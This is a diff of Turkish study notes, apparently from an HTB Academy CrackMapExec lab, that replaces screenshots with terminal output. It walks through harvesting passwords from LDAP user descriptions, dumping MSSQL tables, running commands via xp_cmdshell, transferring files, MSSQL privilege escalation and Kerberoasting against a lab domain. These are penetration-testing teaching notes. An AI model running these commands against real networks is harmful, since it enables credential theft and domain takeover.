 Modülü kullanalım ve ilginç kullanıcı açıklamalarını bulalım:
 
 ### user-desc Modülünü Kullanarak Kullanıcı Açıklamasını Alma
-![Pasted image 20241202020351.png](/img/user/resimler/Pasted%20image%2020241202020351.png)
 
-Gördüğümüz gibi, key ve pass anahtar kelimelerini içeren açıklamayı görüntüler, ancak tüm açıklamalar günlük dosyasına kaydedilir
+```
+crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M
+user-desc
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+USER-DES... User: krbtgt -
+Description: Key Distribution Center Service Account
+USER-DES... User: alina -
+Description: Account for testing HR App. Password: HRApp123!
+USER-DES... Saved 6 user
+descriptions to /home/plaintext/.cme/logs/UserDesc-10.129.203.121-
+20221031_120444.log
+```
+
+Gördüğümüz gibi, `key` ve `pass` anahtar kelimelerini içeren açıklamayı görüntüler, ancak tüm açıklamalar log dosyasına kaydedilir
 
 
 ### Dosyayı Tüm Açıklamalarla Açma
-![Pasted image 20241202020456.png](/img/user/resimler/Pasted%20image%2020241202020456.png)
-![Pasted image 20241202020500.png](/img/user/resimler/Pasted%20image%2020241202020500.png)
+
+```
+cat /home/plaintext/.cme/logs/UserDesc-10.129.203.121-20221031_120444.log
+
+User: Description:
+Administrator Built-in account for administering the
+computer/domain
+Guest Built-in account for guest access to the
+computer/domain
+krbtgt Key Distribution Center Service Account
+alina Account for testing HR App. Password: HRApp123!
+engels Service Account for testing
+testaccount pwd: Testing123!
+```
 
 
-### Seçenekli Modül Kullanımı
-Eğer bir modül seçeneği kullanmak istiyorsak -o bayrağını kullanmamız gerekir. Tüm seçenekler KEY=value şeklinde belirtilir (msfvenom stili). Aşağıdaki örnekte, varsayılan anahtar kelimeleri ve ekran değerlerini pwd ve admin anahtar kelimeleriyle değiştireceğiz.
 
-### user-desc'i Yeni Anahtar Kelimelerle Kullanma
-![Pasted image 20241202020554.png](/img/user/resimler/Pasted%20image%2020241202020554.png)
+### Seçeneklerle Bir Modül Kullanma
+
+Eğer bir modül seçeneği kullanmak istiyorsak `-o` bayrağını kullanmamız gerekir. Tüm seçenekler `KEY=value` şeklinde belirtilir (msfvenom stili). Aşağıdaki örnekte, varsayılan anahtar kelimeleri ve ekran değerlerini `pwd` ve `admin` anahtar kelimeleriyle değiştireceğiz.
+
+### Yeni Anahtar Kelimelerle user-desc Kullanma
+
+```
+crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+USER-DES... User:
+Administrator - Description: Built-in account for administering the
+computer/domain
+USER-DES... User:
+testaccount - Description: pwd: Testing123!
+USER-DES... Saved 6 user
+descriptions to /home/plaintext/.cme/logs/UserDesc-10.129.203.121-
+20221031_123727.log
+```
 
 
 ### Kullanıcı Üyeliğini Sorgulama
-groupmembership, bu eğitim sırasında bir HTB Akademi eğitim geliştiricisi tarafından oluşturulan ve bir kullanıcının ait olduğu grupları sorgulamamızı sağlayan bir başka modül örneğidir (kendi modüllerinizi nasıl oluşturacağınızı daha sonra tartışacağız). Kullanmak için USER seçeneği ile sorgulamak istediğimiz kullanıcıyı belirtmemiz gerekiyor.
+
+`groupmembership`, bir kullanıcının ait olduğu grupları sorgulamamızı sağlayan bir başka modül örneğidir (kendi modüllerinizi nasıl oluşturacağınızı daha sonra tartışacağız). Kullanmak için `USER` seçeneği ile sorgulamak istediğimiz kullanıcıyı belirtmemiz gerekiyor.
 
 Bu eğitimin yazıldığı sırada bu modül için bir [PR](https://github.com/byt3bl33d3r/CrackMapExec/pull/696) var, ancak indirilir ve onaylanana kadar modüller klasörüne yerleştirilirse kullanılabilir.
 
 
 ### Özel Modül ile Grup Üyeliğini Sorgulama
-![Pasted image 20241202020915.png](/img/user/resimler/Pasted%20image%2020241202020915.png)
-![Pasted image 20241202020933.png](/img/user/resimler/Pasted%20image%2020241202020933.png)
+
+```
+cd CrackMapExec/cme/modules/
+
+wget https://raw.githubusercontent.com/PorchettaIndustries/CrackMapExec/7d1e0fdaaf94b706155699223f984b6f9853fae4/cme/modul
+es/groupmembership.py -q
+
+crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+GROUPMEM... dc01.inlanefreight.htb 389 DC01 [+] User:
+julio is member of following groups:
+GROUPMEM... dc01.inlanefreight.htb 389 DC01 Server
+Operators
+GROUPMEM... dc01.inlanefreight.htb 389 DC01 Domain Admins
+GROUPMEM... dc01.inlanefreight.htb 389 DC01 Domain Users
+
+```
+
+
+---
 
 
 ### MSSQL Enumeration and Attacks
+
 Bir MSSQL sunucusu bulmak çok ilginçtir çünkü veritabanları genellikle saldırı operasyonlarımızı ilerletmek ve daha fazla erişim elde etmek için kullanabileceğimiz bilgiler içerir. Değerlendirmemizin amacı olan hassas verilere de erişim elde edebiliriz. Ayrıca, [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) özelliğini kullanarak bir MSSQL veritabanı üzerinden işletim sistemi komutlarını çalıştırabiliriz.
 
-Parola Püskürtme bölümünde tartıştığımız gibi, SQL'e üç farklı türde kullanıcı hesabı ile kimlik doğrulaması yapabiliriz. Veritabanı üzerinde hangi yetkilere sahip olduğumuzu ve hangi veritabanına erişimimiz olduğunu göz önünde bulundurmak ve veritabanı dba (veritabanı yöneticisi) kullanıcısı olup olmadığımızı doğrulamak da önemlidir.
+Password Spray bölümünde tartıştığımız gibi, SQL'e üç farklı türde kullanıcı hesabı ile kimlik doğrulaması yapabiliriz. Veritabanı üzerinde hangi yetkilere sahip olduğumuzu ve hangi veritabanına erişimimiz olduğunu göz önünde bulundurmak ve veritabanı dba (veritabanı yöneticisi) kullanıcısı olup olmadığımızı doğrulamak da önemlidir.
 
 Veritabanlarıyla çalışırken genellikle iki işlem gerçekleştiririz:
+
 * SQL Sorgularını Yürütme
 * Windows Komutlarını Yürütme
 
 ### SQL Sorgularını Yürütme
-SQL sorgusu veritabanı ile etkileşim kurmamızı sağlar. Bilgi alabilir veya veritabanı tablolarına veri ekleyebiliriz. Ayrıca veritabanının yönetim ve idaresinin farklı operasyonel işlevlerini de kullanabiliriz. Bir hesap aldıktan sonra, -q seçeneğini kullanarak bir SQL sorgusu gerçekleştirebiliriz.
+
+SQL sorgusu veritabanı ile etkileşim kurmamızı sağlar. Bilgi alabilir veya veritabanı tablolarına veri ekleyebiliriz. Ayrıca veritabanının yönetim ve administration farklı operasyonel işlevlerini de kullanabiliriz. Bir hesap aldıktan sonra, -q seçeneğini kullanarak bir SQL sorgusu gerçekleştirebiliriz.
 
 
 ### Tüm Veritabanı Adlarını Almak için SQL Sorgusu
-![Pasted image 20241202024204.png](/img/user/resimler/Pasted%20image%2020241202024204.png)
-Bir MSSQL kullanıcısı belirtmek için --local-auth seçeneğini de kullanabiliriz. Bu seçeneği seçmezsek, bunun yerine bir domain hesabı kullanılacaktır.
+
+```
+crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases"
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:inlanefreight.htb)
+MSSQL 10.129.203.121 1433 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+MSSQL 10.129.203.121 1433 DC01 name
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+--------------------------------------------------------------------------
+--------------------------------
+MSSQL 10.129.203.121 1433 DC01 master
+MSSQL 10.129.203.121 1433 DC01 tempdb
+MSSQL 10.129.203.121 1433 DC01 model
+MSSQL 10.129.203.121 1433 DC01 msdb
+MSSQL 10.129.203.121 1433 DC01 core_app
+MSSQL 10.129.203.121 1433 DC01 core_business
+
+```
+
+Bir MSSQL kullanıcısı belirtmek için `--local-auth` seçeneğini de kullanabiliriz. Bu seçeneği seçmezsek, bunun yerine bir domain hesabı kullanılacaktır.
 
 
 ### SQL Queries
-![Pasted image 20241202024348.png](/img/user/resimler/Pasted%20image%2020241202024348.png)
-![Pasted image 20241202024355.png](/img/user/resimler/Pasted%20image%2020241202024355.png)
+
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! - localauth -q "SELECT name FROM master.dbo.sysdatabases"
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [+]
+nicole:Inlanefreight02! (Pwn3d!)
+MSSQL 10.129.203.121 1433 DC01 name
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+--------------------------------------------------------------------------
+--------------------------------
+MSSQL 10.129.203.121 1433 DC01 master
+MSSQL 10.129.203.121 1433 DC01 tempdb
+MSSQL 10.129.203.121 1433 DC01 model
+MSSQL 10.129.203.121 1433 DC01 msdb
+MSSQL 10.129.203.121 1433 DC01 core_app
+MSSQL 10.129.203.121 1433 DC01 core_business
+
+```
+
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! - localauth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [+]
+nicole:Inlanefreight02! (Pwn3d!)
+MSSQL 10.129.203.121 1433 DC01 table_name
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+--------------------------------------------------------------------------
+--------------------------------
+MSSQL 10.129.203.121 1433 DC01 tbl_users
+```
+
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -q "SELECT * from [core_app].[dbo].tbl_users"
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [+]
+nicole:Inlanefreight02! (Pwn3d!)
+MSSQL 10.129.203.121 1433 DC01 id_user
+MSSQL 10.129.203.121 1433 DC01 name
+MSSQL 10.129.203.121 1433 DC01 lastname
+MSSQL 10.129.203.121 1433 DC01 username
+MSSQL 10.129.203.121 1433 DC01 password
+MSSQL 10.129.203.121 1433 DC01 -----------
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+----------------------------
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+----------------------------
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+----------------------------
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+----------------------------
+MSSQL 10.129.203.121 1433 DC01 1
+MSSQL 10.129.203.121 1433 DC01 b'Josh'
+MSSQL 10.129.203.121 1433 DC01 b'Matt'
+MSSQL 10.129.203.121 1433 DC01 b'josematt'
+MSSQL 10.129.203.121 1433 DC01 b'Testing123'
+MSSQL 10.129.203.121 1433 DC01 2
+MSSQL 10.129.203.121 1433 DC01 b'Elie'
+MSSQL 10.129.203.121 1433 DC01 b'Cart'
+MSSQL 10.129.203.121 1433 DC01 b'eliecart'
+MSSQL 10.129.203.121 1433 DC01 b'Motor999'
+```
 
 
-![Pasted image 20241202025406.png](/img/user/resimler/Pasted%20image%2020241202025406.png)
-
-
-![Pasted image 20241202025541.png](/img/user/resimler/Pasted%20image%2020241202025541.png)
-![Pasted image 20241202025547.png](/img/user/resimler/Pasted%20image%2020241202025547.png)
-
-Veritabanlarını, tabloları ve içeriği listelemek için bazı veritabanı sorguları gerçekleştirdik. SQL sorguları kullanarak veritabanlarının nasıl numaralandırılacağı hakkında daha fazla bilgi edinmek için Attacking Common Services modülünden Attacking SQL Databases bölümünü okuyabiliriz
-
+Veritabanlarını, tabloları ve içeriği listelemek için bazı veritabanı sorguları gerçekleştirdik. 
 
 ### Windows Komutlarını Yürütme
 
-Bir hesap bulduğumuzda, CrackMapExec otomatik olarak kullanıcının bir DBA (Veritabanı Yöneticisi) hesabı olup olmadığını kontrol edecektir. Çıktıyı fark edersek Pwn3d! , kullanıcı bir Veritabanı Yöneticisidir. DBA ayrıcalıklarına sahip kullanıcılar bir veritabanı nesnesine erişebilir, değiştirebilir veya silebilir ve diğer kullanıcılara haklar verebilir. Bu kullanıcı veritabanına karşı herhangi bir eylem gerçekleştirebilir.
+Bir hesap bulduğumuzda, CrackMapExec otomatik olarak kullanıcının bir DBA  (Database Administrator) hesabı olup olmadığını kontrol edecektir. Çıktıyı fark edersek `Pwn3d!` , kullanıcı bir Database Administrator'dür. DBA ayrıcalıklarına sahip kullanıcılar bir veritabanı objesine erişebilir, değiştirebilir veya silebilir ve diğer kullanıcılara haklar verebilir. Bu kullanıcı veritabanına karşı herhangi bir eylem gerçekleştirebilir.
 
 
 ### DBA Hesabı ile Kimlik Doğrulama
-![Pasted image 20241202030356.png](/img/user/resimler/Pasted%20image%2020241202030356.png)
 
-MSSQL, SQL kullanarak sistem komutlarını yürütmemizi sağlayan xp_cmdshell adlı bir extended stored procedure'e sahiptir. Bir DBA hesabı, Windows işletim sistemi komutlarını yürütmek için gereken özellikleri etkinleştirme ayrıcalıklarına sahiptir.
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth
 
-Bir Windows komutunu çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir:
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [+]
+nicole:Inlanefreight02! (Pwn3d!)
+```
+
+MSSQL, SQL kullanarak sistem komutlarını yürütmemizi sağlayan [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) adlı bir [extended stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15)'e sahiptir. Bir DBA hesabı, Windows işletim sistemi komutlarını yürütmek için gereken özellikleri etkinleştirme ayrıcalıklarına sahiptir.
+
+Bir Windows komutunu çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir:
 
 
 ### Executing Windows Commands
-![Pasted image 20241202031816.png](/img/user/resimler/Pasted%20image%2020241202031816.png)
-![Pasted image 20241202031823.png](/img/user/resimler/Pasted%20image%2020241202031823.png)
-Not: MSSQL aracılığıyla Windows komutlarını çalıştırabilmek, Windows makinesinde local administrator olduğumuz anlamına gelmez. Ayrıcalıklarımızı yükseltebilir veya hedef makine hakkında daha fazla bilgi almak için bu erişimi kullanabiliriz.
+
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -x whoami
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [+]
+nicole:Inlanefreight02! (Pwn3d!)
+MSSQL 10.129.203.121 1433 DC01 [+] Executed command
+via mssqlexec
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+----------------------------------------------------------
+MSSQL 10.129.203.121 1433 DC01
+inlanefreight\svc_mssql
+```
+
+Not: MSSQL aracılığıyla Windows komutlarını çalıştırabilmek, Windows makinesinde `local administrator` olduğumuz anlamına gelmez. Ayrıcalıklarımızı yükseltebilir veya hedef makine hakkında daha fazla bilgi almak için bu erişimi kullanabiliriz.
 
 
 ### MSSQL ile Dosya Aktarma
-MSSQL, sırasıyla OPENROWSET (Transact-SQL) ve Ole Automation Procedures Sunucu Yapılandırma Seçeneklerini kullanarak dosyaları indirmemize ve yüklememize izin verir. CrackMapExec bu seçenekleri --put-file ve --get-file ile birleştirir.
 
-Hedef makinemize bir dosya yüklemek için --put-file seçeneğini ve ardından yüklemek istediğimiz yerel dosyayı ve hedef dizini kullanabiliriz
+MSSQL, sırasıyla [OPENROWSET (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql) ve [Ole Automation Procedures Sunucu Yapılandırma Seçeneklerini](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) kullanarak dosyaları indirmemize ve yüklememize izin verir. CrackMapExec bu seçenekleri -`-put-file` ve -`-get-file` ile birleştirir.
+
+Hedef makinemize bir dosya yüklemek için `--put-file` seçeneğini ve ardından yüklemek istediğimiz local dosyayı ve hedef dizini kullanabiliriz
 
 
-### Upload File
+### Upload File (Dosya Yükle)
 
-![Pasted image 20241202033530.png](/img/user/resimler/Pasted%20image%2020241202033530.png)
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth --put-file /etc/passwd C:/Users/Public/passwd
 
-![Pasted image 20241202035910.png](/img/user/resimler/Pasted%20image%2020241202035910.png)
-![Pasted image 20241202035921.png](/img/user/resimler/Pasted%20image%2020241202035921.png)
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [+]
+nicole:Inlanefreight02! (Pwn3d!)
+MSSQL 10.129.203.121 1433 DC01 [*] Copy /etc/passwd
+to C:/Users/Public/passwd
+MSSQL 10.129.203.121 1433 DC01 [*] Size is 3456 bytes
+MSSQL 10.129.203.121 1433 DC01 [+] File has been
+uploaded on the remote machine
+```
 
-Bir dosyayı indirmek için, --get-file seçeneğini kullanmamız ve ardından dosyanın yolunu ve bir çıktı dosyası adı belirlememiz gerekir.
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -x "dir c:\Users\Public"
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [+]
+nicole:Inlanefreight02! (Pwn3d!)
+MSSQL 10.129.203.121 1433 DC01 [+] Executed command
+via mssqlexec
+MSSQL 10.129.203.121 1433 DC01
+----------------------------------------------------------
+MSSQL 10.129.203.121 1433 DC01 Volume in drive C has
+no label.
+MSSQL 10.129.203.121 1433 DC01 Volume Serial Number
+is B8B3-0D72
+MSSQL 10.129.203.121 1433 DC01 Directory of
+c:\Users\Public
+MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
+<DIR> .
+MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
+<DIR> ..
+MSSQL 10.129.203.121 1433 DC01 10/06/2021 02:38 PM
+<DIR> Documents
+MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
+<DIR> Downloads
+MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
+<DIR> Music
+MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
+3,456 passwd
+MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
+<DIR> Pictures
+MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
+<DIR> Videos
+MSSQL 10.129.203.121 1433 DC01 1 File(s)
+3,456 bytes
+MSSQL 10.129.203.121 1433 DC01 7 Dir(s)
+10,588,659,712 bytes free
+
+```
+
+
+Bir dosyayı indirmek için, `--get-file` seçeneğini kullanmamız ve ardından dosyanın yolunu ve bir çıktı dosyası adı belirlememiz gerekir.
 
 
 ### MSSQL aracılığıyla Hedef Makineden Dosya İndirme
-![Pasted image 20241202040010.png](/img/user/resimler/Pasted%20image%2020241202040010.png)
-![Pasted image 20241202040015.png](/img/user/resimler/Pasted%20image%2020241202040015.png)
+
+```
+crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth --get-file C:/Windows/System32/drivers/etc/hosts hosts
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [+]
+nicole:Inlanefreight02! (Pwn3d!)
+MSSQL 10.129.203.121 1433 DC01 [*] Copy
+C:/Windows/System32/drivers/etc/hosts to hosts
+MSSQL 10.129.203.121 1433 DC01 [+] File
+C:/Windows/System32/drivers/etc/hosts was transferred to hosts
+
+
+cat hosts
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+<SNIP>
+
+```
+
+
 
 
 
 ### SQL Privilege Escalation **Module**
-CrackMapExec, MSSQL için birkaç modül içerir; bunlardan biri, standart bir kullanıcıdan sistem yöneticisine yükselmeye çalışmak için MSSQL ayrıcalıklarını numaralandıran ve kullanan mssql_priv'dir. Bunu başarmak için, bu modül MSSQL EXECUTE AS LOGIN ve db_owner rolündeki iki (2) farklı ayrıcalık yükseltme vektörünü numaralandırır. Modülün ayrıcalıkları listelemek için enum_privs (varsayılan), ayrıcalıkları yükseltmek için privesc ve kullanıcıyı orijinal durumuna döndürmek için rollback olmak üzere üç seçeneği vardır. Şimdi bunu iş başında görelim. Aşağıdaki örnekte, INLANEFREIGHT\robert kullanıcısı bir sysadmin kullanıcısı olan julio'yu taklit etme ayrıcalığına sahiptir
+
+CrackMapExec, MSSQL için birkaç modül içerir, bunlardan biri **`mssql_priv`**'dir. Bu modül, MSSQL ayrıcalıklarını sıralar ve kullanarak bir standart kullanıcıdan sysadmin yetkilerine yükselmeye çalışır. Bunu başarmak için, bu modül MSSQL'deki iki (2) ayrıcalık yükseltme vektörünü sıralar: **`EXECUTE AS LOGIN`** ve **`db_owner rolü`**. Modülün üç seçeneği vardır: **`enum_privs`** (ayrıcalıkları listelemek için, varsayılan), **`privesc`** (ayrıcalıkları yükseltmek için) ve **`rollback`** (kullanıcıyı orijinal durumuna geri döndürmek için). Şimdi bunu nasıl çalıştığını görelim. Aşağıdaki örnekte, kullanıcı **`INLANEFREIGHT\robert`**, sysadmin yetkilerine sahip olan **`julio`**'yu taklit etme ayrıcalığına sahiptir.
 
 
 ### MSSQL Privilege Escalation
-![Pasted image 20241202131137.png](/img/user/resimler/Pasted%20image%2020241202131137.png)
 
-![Pasted image 20241202131142.png](/img/user/resimler/Pasted%20image%2020241202131142.png)
+```
+crackmapexec mssql -M mssql_priv --options
+[*] mssql_priv module options:
+ ACTION Specifies the action to perform:
+ - enum_priv (default)
+ - privesc
+ - rollback (remove sysadmin privilege)
+```
 
-![Pasted image 20241202131222.png](/img/user/resimler/Pasted%20image%2020241202131222.png)
+```
+crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:inlanefreight.htb)
+MSSQL 10.129.203.121 1433 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+MSSQL_PR... 10.129.203.121 1433 DC01 [+]
+INLANEFREIGHT\robert can impersonate julio (sysadmin)
+```
+
+```
+crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:inlanefreight.htb)
+MSSQL 10.129.203.121 1433 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+MSSQL_PR... 10.129.203.121 1433 DC01 [+]
+INLANEFREIGHT\robert can impersonate julio (sysadmin)
+MSSQL_PR... 10.129.203.121 1433 DC01 [+]
+INLANEFREIGHT\robert is now a sysadmin! (Pwn3d!)
+
+```
 
 Bir sysadmin kullanıcısı olarak artık komutları çalıştırabiliriz. Bunu yapalım ve ardından ayrıcalıklarımızı orijinal durumlarına geri döndürelim
 
 
 ### Komutları Yürütme ve Ayrıcalıkları Geri Alma
-![Pasted image 20241202131257.png](/img/user/resimler/Pasted%20image%2020241202131257.png)
 
-![Pasted image 20241202131304.png](/img/user/resimler/Pasted%20image%2020241202131304.png)
+```
+crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami
 
-![Pasted image 20241202131312.png](/img/user/resimler/Pasted%20image%2020241202131312.png)
-![Pasted image 20241202131317.png](/img/user/resimler/Pasted%20image%2020241202131317.png)
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:inlanefreight.htb)
+MSSQL 10.129.203.121 1433 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+MSSQL 10.129.203.121 1433 DC01 [+] Executed command
+via mssqlexec
+MSSQL 10.129.203.121 1433 DC01 ----------------------
+----------------------------------------------------------
+MSSQL 10.129.203.121 1433 DC01
+inlanefreight\svc_mssql
+```
 
-Not: Modülü sahip olduğumuz kullanıcılarla test etmek için, --no-bruteforce ve --continue-on-success ile çoklu kullanıcı işlevselliği bir modülü aynı anda birden fazla hesapla test etmeyi desteklemediğinden, bunları tek tek denemek gerekir.
+```
+crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:inlanefreight.htb)
+MSSQL 10.129.203.121 1433 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+MSSQL_PR... 10.129.203.121 1433 DC01 [+] sysadmin role
+removed
+```
+
+```
+crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:inlanefreight.htb)
+MSSQL 10.129.203.121 1433 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+```
+
+
+Not: Modülü sahip olduğumuz kullanıcılarla test etmek için, `--no-bruteforce` ve            `--continue-on-success` ile çoklu kullanıcı işlevselliği bir modülü aynı anda birden fazla hesapla test etmeyi desteklemediğinden, bunları tek tek denemek gerekir.
 
 
 ### Finding Kerberoastable Accounts
-Kerberoasting saldırısı, tipik olarak bir hizmet hesabı olan servicePrincipalName (SPN) değerlerine sahip bir kullanıcıdan TGS (Ticket Granting Service) Biletleri toplamayı amaçlar. Herhangi bir geçerli Active Directory hesabı, herhangi bir SPN hesabı için bir TGS talep edebilir. Biletin bir kısmı hesabın NTLM parola hash'i ile şifrelenir, bu da parolayı çevrimdışı olarak kırmayı denememize olanak tanır. Bu saldırının nasıl çalıştığı hakkında daha fazla bilgi edinmek için Active Directory Numaralandırma ve Saldırılar modülünün Kerberoasting bölümüne göz atın.
 
-Kerberoastable hesaplarını bulmak için, domain'de geçerli bir kullanıcıya sahip olmamız, --kerberoasting seçeneği ve ardından bir dosya adı ile LDAP protokolünü kullanmamız ve DC'nin IP adresini CrackMapExec'te hedef olarak belirtmemiz gerekir:
+Kerberoasting saldırısı, tipik olarak bir servis hesabı olan `servicePrincipalName (SPN)` değerlerine sahip bir kullanıcıdan TGS (Ticket Granting Service) Biletleri toplamayı amaçlar. Herhangi bir geçerli Active Directory hesabı, herhangi bir SPN hesabı için bir TGS talep edebilir. Ticket'ın bir kısmı hesabın `NTLM parola hash'i` ile şifrelenir, bu da parolayı çevrimdışı olarak kırmayı denememize olanak tanır. 
+
+Kerberoastable hesaplarını bulmak için, domain'de geçerli bir kullanıcıya sahip olmamız, `--kerberoasting` seçeneği ve ardından bir dosya adı ile LDAP protokolünü kullanmamız ve DC'nin IP adresini CrackMapExec'te hedef olarak belirtmemiz gerekir:
 
 
 ### Kerberoasting Attack
-![Pasted image 20241202132926.png](/img/user/resimler/Pasted%20image%2020241202132926.png)
-![Pasted image 20241202133020.png](/img/user/resimler/Pasted%20image%2020241202133020.png)
-![Pasted image 20241202133108.png](/img/user/resimler/Pasted%20image%2020241202133108.png)
-![Pasted image 20241202133123.png](/img/user/resimler/Pasted%20image%2020241202133123.png)
 
-Herhangi bir Kerberoastable hesabı varsa, CrackMapExec bunları çevrimdışı olarak kırmayı denememiz gereken hash ile birlikte görüntüler. Bizim durumumuzda, şifreyi kırmak için rockyou.txt kelime listesini ve Hashcat uygulamasını kullanacağız. Hashcat kullanımı hakkında daha fazla bilgi için Hashcat ile Şifre Kırma modülüne bakın.
+```
+crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
+records returned 4
+CRITICAL:impacket:CCache file is not found. Skipping...
+LDAP dc01.inlanefreight.htb 389 DC01 sAMAccountName:
+grace memberOf: CN=SQL Admins,CN=Users,DC=inlanefreight,DC=htb pwdLastSet:
+2022-10-25 15:48:04.646233 lastLogon:2022-12-01 07:20:01.171413
+LDAP dc01.inlanefreight.htb 389 DC01
+$krb5tgs$23$*grace$INLANEFREIGHT.HTB$inlanefreight.htb/grace*$ce19d59e7823
+310c7fb51920d24bd56c$1cc46b764998c6077ee9a7f5a215a93bbae3b3a944584ac373823
